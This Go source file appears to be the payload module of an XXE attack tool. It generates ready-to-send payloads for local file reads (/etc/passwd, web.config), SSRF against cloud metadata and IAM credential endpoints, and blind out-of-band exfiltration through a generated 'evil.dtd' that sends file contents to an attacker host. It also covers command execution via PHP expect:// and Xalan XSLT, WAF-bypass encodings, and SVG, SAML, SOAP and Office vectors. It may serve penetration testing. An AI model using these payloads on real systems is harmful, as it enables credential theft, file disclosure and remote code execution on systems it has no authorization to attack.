package payloads

import (
	"fmt"
	"strings"
)

// Payload represents a single XXE test payload
type Payload struct {
	ID          string
	Name        string
	Technique   string
	Framework   string
	Description string
	ContentType string
	Body        string
	Tags        []string
}

// Builder constructs payloads for given technique + target
type Builder struct {
	OOBDomain    string
	DTDServer    string
	FilesToRead  []string
	CollabDomain string
}

func NewBuilder(oob, dtd, collab string, files []string) *Builder {
	if len(files) == 0 {
		files = []string{"/etc/passwd", "/etc/hostname", "/proc/version"}
	}
	return &Builder{
		OOBDomain:    oob,
		DTDServer:    dtd,
		CollabDomain: collab,
		FilesToRead:  files,
	}
}

// Build returns all payloads matching the given techniques/frameworks
func (b *Builder) Build(techniques, frameworks []string) []Payload {
	var all []Payload

	techSet := toSet(techniques)
	fwSet := toSet(frameworks)
	matchAll := fwSet["all"] || len(fwSet) == 0

	groups := b.allPayloadGroups()
	for _, pg := range groups {
		if !techSet[pg.Technique] {
			continue
		}
		if !matchAll && !fwSet[pg.Framework] {
			continue
		}
		all = append(all, pg)
	}
	return all
}

func (b *Builder) oobTarget() string {
	if b.CollabDomain != "" {
		return b.CollabDomain
	}
	if b.OOBDomain != "" {
		return b.OOBDomain
	}
	return "REPLACE_WITH_COLLABORATOR_OR_INTERACT_SH_DOMAIN"
}

func (b *Builder) dtdURL() string {
	if b.DTDServer != "" {
		return b.DTDServer + "/evil.dtd"
	}
	return "http://" + b.oobTarget() + "/evil.dtd"
}

func (b *Builder) allPayloadGroups() []Payload {
	var pls []Payload

	// ─── CLASSIC FILE READ ───────────────────────────────────────────────────
	for _, f := range b.FilesToRead {
		pls = append(pls, Payload{
			ID:          "classic-filread-" + sanitize(f),
			Name:        "Classic File Read: " + f,
			Technique:   "classic",
			Framework:   "all",
			Description: "Direct XXE file read - entity substituted in output",
			ContentType: "application/xml",
			Body: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://%s">
]>
<root><data>&xxe;</data></root>`, f),
			Tags: []string{"classic", "file-read"},
		})
	}

	// Windows targets
	for _, f := range []string{
		`C:/Windows/win.ini`,
		`C:/Windows/System32/drivers/etc/hosts`,
		`C:/inetpub/wwwroot/web.config`,
	} {
		pls = append(pls, Payload{
			ID:          "classic-win-" + sanitize(f),
			Name:        "Classic Windows File Read: " + f,
			Technique:   "classic",
			Framework:   "dotnet",
			ContentType: "application/xml",
			Body: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///%s">]>
<root>&xxe;</root>`, f),
			Tags: []string{"classic", "windows", "dotnet"},
		})
	}

	// PHP filter wrapper
	pls = append(pls, Payload{
		ID:          "classic-php-filter",
		Name:        "PHP Filter Base64 Exfil",
		Technique:   "classic",
		Framework:   "php",
		Description: "PHP php://filter wrapper reads binary/special char files as base64",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>`,
		Tags: []string{"classic", "php", "filter", "base64"},
	})

	pls = append(pls, Payload{
		ID:          "classic-php-expect",
		Name:        "PHP expect:// RCE",
		Technique:   "classic",
		Framework:   "php",
		Description: "RCE via PHP expect module - executes OS command",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>`,
		Tags: []string{"classic", "php", "rce", "expect"},
	})

	// ─── SSRF ────────────────────────────────────────────────────────────────
	ssrfTargets := []struct{ name, url string }{
		{"AWS-IMDSv1", "http://169.254.169.254/latest/meta-data/"},
		{"AWS-IMDSv2-Token", "http://169.254.169.254/latest/api/token"},
		{"AWS-IAM-Creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
		{"GCP-Metadata", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"},
		{"Azure-Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
		{"Internal-80", "http://127.0.0.1:80/"},
		{"Internal-8080", "http://127.0.0.1:8080/"},
		{"Internal-8443", "http://127.0.0.1:8443/"},
		{"Redis", "http://127.0.0.1:6379/"},
		{"Elasticsearch", "http://127.0.0.1:9200/_cat/indices"},
		{"Kubernetes-API", "http://10.96.0.1:443/api/v1/namespaces"},
		{"OOB-SSRF", "http://" + b.oobTarget() + "/ssrf-probe"},
	}

	for _, t := range ssrfTargets {
		pls = append(pls, Payload{
			ID:          "ssrf-" + sanitize(t.name),
			Name:        "SSRF → " + t.name,
			Technique:   "ssrf",
			Framework:   "all",
			Description: "SSRF via XXE to " + t.name,
			ContentType: "application/xml",
			Body: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "%s">]>
<root>&ssrf;</root>`, t.url),
			Tags: []string{"ssrf", strings.ToLower(t.name)},
		})
	}

	// ─── BLIND OOB ───────────────────────────────────────────────────────────
	pls = append(pls, Payload{
		ID:          "blind-oob-basic",
		Name:        "Blind OOB Detection (HTTP)",
		Technique:   "oob",
		Framework:   "all",
		Description: "Detect blind XXE via OOB HTTP interaction",
		ContentType: "application/xml",
		Body: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY %% xxe SYSTEM "http://%s/xxe-detection">
  %%xxe;
]>
<root/>`, b.oobTarget()),
		Tags: []string{"blind", "oob", "detection"},
	})

	pls = append(pls, Payload{
		ID:          "blind-oob-param",
		Name:        "Blind OOB Parameter Entity",
		Technique:   "oob",
		Framework:   "all",
		Description: "Parameter entity OOB - works when general entities are blocked",
		ContentType: "application/xml",
		Body: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY %% a SYSTEM "http://%s/param-entity-probe">
  %%a;
]>
<foo/>`, b.oobTarget()),
		Tags: []string{"blind", "oob", "parameter-entity"},
	})

	pls = append(pls, Payload{
		ID:          "blind-oob-dtd-exfil",
		Name:        "Blind OOB Data Exfil via DTD",
		Technique:   "blind",
		Framework:   "all",
		Description: "Loads external DTD to exfiltrate /etc/passwd via HTTP",
		ContentType: "application/xml",
		Body: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY %% dtd SYSTEM "%s">
  %%dtd;
]>
<root/>`, b.dtdURL()),
		Tags: []string{"blind", "oob", "dtd", "exfil"},
	})

	// ─── ERROR-BASED BLIND ───────────────────────────────────────────────────
	pls = append(pls, Payload{
		ID:          "error-based-local",
		Name:        "Error-Based Blind XXE (Local)",
		Technique:   "error",
		Framework:   "java",
		Description: "Triggers parse error that leaks file content in error message",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///XXESHOT_INVALID/%file;'>">
  %eval;
  %err;
]>
<root/>`,
		Tags: []string{"blind", "error-based", "no-oob"},
	})

	pls = append(pls, Payload{
		ID:          "error-based-yelp-dtd",
		Name:        "Error-Based via Local DTD (Yelp/docbookx)",
		Technique:   "error",
		Framework:   "all",
		Description: "Uses local system DTD to trigger error-based exfil - no outbound needed",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY %% file SYSTEM "file:///etc/passwd">
    <!ENTITY %% err SYSTEM "file:///XXESHOT_INVALID/%%file;">
    %%err;
  '>
  %local_dtd;
]>
<root/>`,
		Tags: []string{"blind", "error-based", "local-dtd", "no-server"},
	})

	// More local DTD paths
	localDTDs := []string{
		"/usr/share/xml/fontconfig/fonts.dtd",
		"/usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd",
		"/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
	}
	for _, dtd := range localDTDs {
		pls = append(pls, Payload{
			ID:          "error-dtd-" + sanitize(dtd),
			Name:        "Error-Based Local DTD: " + dtd,
			Technique:   "error",
			Framework:   "all",
			ContentType: "application/xml",
			Body: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY %% ldtd SYSTEM "file://%s">
  %%ldtd;
]>
<root/>`, dtd),
			Tags: []string{"error-based", "local-dtd"},
		})
	}

	// ─── XINCLUDE ────────────────────────────────────────────────────────────
	for _, f := range b.FilesToRead {
		pls = append(pls, Payload{
			ID:          "xinclude-" + sanitize(f),
			Name:        "XInclude File Read: " + f,
			Technique:   "xinclude",
			Framework:   "all",
			Description: "XInclude works without DOCTYPE - inject in any XML fragment",
			ContentType: "application/xml",
			Body: fmt.Sprintf(`<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file://%s"/>
</foo>`, f),
			Tags: []string{"xinclude", "no-doctype", "waf-bypass"},
		})
	}

	pls = append(pls, Payload{
		ID:          "xinclude-ssrf",
		Name:        "XInclude SSRF → AWS Metadata",
		Technique:   "xinclude",
		Framework:   "all",
		ContentType: "application/xml",
		Body: `<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
</foo>`,
		Tags: []string{"xinclude", "ssrf", "aws"},
	})

	pls = append(pls, Payload{
		ID:          "xinclude-oob",
		Name:        "XInclude OOB Detection",
		Technique:   "xinclude",
		Framework:   "all",
		ContentType: "application/xml",
		Body: fmt.Sprintf(`<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="http://%s/xinclude-probe" parse="text">
  <xi:fallback>not-found</xi:fallback>
</xi:include>`, b.oobTarget()),
		Tags: []string{"xinclude", "oob"},
	})

	// ─── XSLT ────────────────────────────────────────────────────────────────
	pls = append(pls, Payload{
		ID:          "xslt-doc-read",
		Name:        "XSLT document() File Read",
		Technique:   "xslt",
		Framework:   "java",
		Description: "XSLT document() function reads arbitrary files",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <output>
      <xsl:copy-of select="document('file:///etc/passwd')"/>
    </output>
  </xsl:template>
</xsl:stylesheet>`,
		Tags: []string{"xslt", "file-read"},
	})

	pls = append(pls, Payload{
		ID:          "xslt-java-rce",
		Name:        "XSLT Java Xalan RCE",
		Technique:   "xslt",
		Framework:   "java",
		Description: "Direct OS command execution via Xalan Java extensions",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rt" select="rt:getRuntime()"/>
    <xsl:variable name="proc" select="rt:exec($rt,'id')"/>
    <xsl:variable name="is" select="proc:getInputStream($proc)"/>
    <xsl:variable name="isr" select="isr:new($is)"/>
    <xsl:variable name="br" select="br:new($isr)"/>
    <xsl:value-of select="br:readLine($br)"/>
  </xsl:template>
</xsl:stylesheet>`,
		Tags: []string{"xslt", "java", "rce", "xalan"},
	})

	pls = append(pls, Payload{
		ID:          "xslt-ssrf",
		Name:        "XSLT SSRF via document()",
		Technique:   "xslt",
		Framework:   "all",
		ContentType: "application/xml",
		Body: fmt.Sprintf(`<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('http://%s/xslt-ssrf')"/>
  </xsl:template>
</xsl:stylesheet>`, b.oobTarget()),
		Tags: []string{"xslt", "ssrf", "oob"},
	})

	// ─── CDATA BYPASS ────────────────────────────────────────────────────────
	pls = append(pls, Payload{
		ID:          "cdata-bypass-dtd",
		Name:        "CDATA Bypass via External DTD",
		Technique:   "cdata",
		Framework:   "all",
		Description: "Wraps file content in CDATA to bypass output sanitization filters",
		ContentType: "application/xml",
		Body: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY %% dtd SYSTEM "%s">
  %%dtd;
]>
<root>&joined;</root>`, b.dtdURL()+"/cdata"),
		Tags: []string{"cdata", "bypass", "filter-evasion"},
	})

	// ─── SOAP-SPECIFIC ───────────────────────────────────────────────────────
	for _, f := range []string{"/etc/passwd", "/etc/hostname"} {
		pls = append(pls, Payload{
			ID:          "soap-" + sanitize(f),
			Name:        "SOAP Envelope XXE: " + f,
			Technique:   "classic",
			Framework:   "soap",
			Description: "XXE injected into SOAP Body — common in enterprise web services",
			ContentType: "text/xml; charset=utf-8",
			Body: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://%s">]>
<soapenv:Envelope
  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:web="http://target.com/webservice">
  <soapenv:Header/>
  <soapenv:Body>
    <web:Request>
      <web:data>&xxe;</web:data>
    </web:Request>
  </soapenv:Body>
</soapenv:Envelope>`, f),
			Tags: []string{"soap", "enterprise", "file-read"},
		})
	}

	pls = append(pls, Payload{
		ID:          "soap-oob",
		Name:        "SOAP Blind OOB",
		Technique:   "oob",
		Framework:   "soap",
		ContentType: "text/xml; charset=utf-8",
		Body: fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY %% xxe SYSTEM "http://%s/soap-oob-probe">
  %%xxe;
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body/>
</soapenv:Envelope>`, b.oobTarget()),
		Tags: []string{"soap", "blind", "oob"},
	})

	// ─── SAML-SPECIFIC ───────────────────────────────────────────────────────
	pls = append(pls, Payload{
		ID:          "saml-assertion-xxe",
		Name:        "SAML Assertion XXE",
		Technique:   "classic",
		Framework:   "saml",
		Description: "XXE in SAML Response/Assertion — inject before base64 encoding",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Assertion>
    <saml:AttributeStatement>
      <saml:Attribute Name="uid">
        <saml:AttributeValue>&xxe;</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>`,
		Tags: []string{"saml", "sso", "file-read"},
	})

	// ─── SVG ─────────────────────────────────────────────────────────────────
	for _, f := range []string{"/etc/passwd", "/etc/hostname"} {
		pls = append(pls, Payload{
			ID:          "svg-xxe-" + sanitize(f),
			Name:        "SVG Upload XXE: " + f,
			Technique:   "classic",
			Framework:   "svg",
			Description: "XXE via SVG image upload — triggers on server-side rendering",
			ContentType: "image/svg+xml",
			Body: fmt.Sprintf(`<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://%s">]>
<svg width="800" height="600" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="40" font-size="12">&xxe;</text>
</svg>`, f),
			Tags: []string{"svg", "upload", "file-read"},
		})
	}

	pls = append(pls, Payload{
		ID:          "svg-xinclude",
		Name:        "SVG XInclude File Read",
		Technique:   "xinclude",
		Framework:   "svg",
		ContentType: "image/svg+xml",
		Body: `<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text">
    <xi:fallback>not-found</xi:fallback>
  </xi:include>
</svg>`,
		Tags: []string{"svg", "xinclude", "waf-bypass"},
	})

	// ─── OFFICE FILE ─────────────────────────────────────────────────────────
	pls = append(pls, Payload{
		ID:          "office-xlsx-workbook",
		Name:        "XLSX workbook.xml XXE",
		Technique:   "classic",
		Framework:   "office",
		Description: "Inject into xl/workbook.xml inside .xlsx zip archive",
		ContentType: "application/xml",
		Body: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="&xxe;" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>`,
		Tags: []string{"office", "xlsx", "file-read"},
	})

	pls = append(pls, Payload{
		ID:          "office-docx-word",
		Name:        "DOCX word/document.xml XXE",
		Technique:   "classic",
		Framework:   "office",
		ContentType: "application/xml",
		Body: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>`,
		Tags: []string{"office", "docx", "file-read"},
	})

	// ─── WAF BYPASS VARIANTS ─────────────────────────────────────────────────
	pls = append(pls, Payload{
		ID:          "bypass-utf7",
		Name:        "UTF-7 Encoding Bypass",
		Technique:   "classic",
		Framework:   "all",
		Description: "Bypasses WAF rules using UTF-7 encoded payload",
		ContentType: "application/xml; charset=UTF-7",
		Body:        `<?xml version="1.0" encoding="UTF-7"?>+ADwAIQ-DOCTYPE foo +AFs+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI+AD4+AF0+AD4+ADw-root+AD4+ACY-xxe+ADs+ADw-/root+AD4`,
		Tags:        []string{"bypass", "utf7", "encoding"},
	})

	pls = append(pls, Payload{
		ID:          "bypass-html-entities",
		Name:        "HTML Entity Encoding Bypass",
		Technique:   "classic",
		Framework:   "all",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "&#102;&#105;&#108;&#101;&#58;///etc/passwd">
]>
<root>&xxe;</root>`,
		Tags: []string{"bypass", "encoding", "waf"},
	})

	pls = append(pls, Payload{
		ID:          "bypass-newlines",
		Name:        "Newline Obfuscation",
		Technique:   "classic",
		Framework:   "all",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE
  foo
[<!ENTITY
  xxe
  SYSTEM
  "file:///etc/passwd">]>
<root>&xxe;</root>`,
		Tags: []string{"bypass", "obfuscation"},
	})

	// ─── JAVA-SPECIFIC ───────────────────────────────────────────────────────
	pls = append(pls, Payload{
		ID:          "java-spring-xml",
		Name:        "Spring MVC XML Body",
		Technique:   "classic",
		Framework:   "java",
		Description: "Spring Boot endpoints may accept XML via content negotiation",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<requestDto><field>&xxe;</field></requestDto>`,
		Tags: []string{"java", "spring", "rest"},
	})

	pls = append(pls, Payload{
		ID:          "java-dom4j",
		Name:        "DOM4J SAXReader XXE",
		Technique:   "classic",
		Framework:   "java",
		ContentType: "application/xml",
		Body: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document><content>&xxe;</content></document>`,
		Tags: []string{"java", "dom4j", "sax"},
	})

	return pls
}

// EvilDTD generates the evil.dtd content for hosting on OOB server
func (b *Builder) EvilDTD(fileToExfil string) string {
	return fmt.Sprintf(`<!ENTITY %% file SYSTEM "file://%s">
<!ENTITY %% eval "<!ENTITY &amp;#x25; exfil SYSTEM 'http://%s/?data=%%file;'>">
%%eval;
%%exfil;`, fileToExfil, b.oobTarget())
}

// CDATADtd generates a CDATA-wrapping evil.dtd
func (b *Builder) CDATADtd(fileToExfil string) string {
	return fmt.Sprintf(`<!ENTITY %% start "<![CDATA[">
<!ENTITY %% file SYSTEM "file://%s">
<!ENTITY %% end "]]>">
<!ENTITY %% all "<!ENTITY joined '%%start;%%file;%%end;'>">
%%all;`, fileToExfil)
}

func sanitize(s string) string {
	r := strings.NewReplacer("/", "_", ".", "_", ":", "_", " ", "_")
	return strings.Trim(r.Replace(s), "_")
}

func toSet(items []string) map[string]bool {
	s := make(map[string]bool)
	for _, v := range items {
		s[strings.TrimSpace(strings.ToLower(v))] = true
	}
	return s
}

// DTDServerURL returns the full URL for the evil.dtd
func (b *Builder) DTDServerURL() string {
	return b.dtdURL()
}
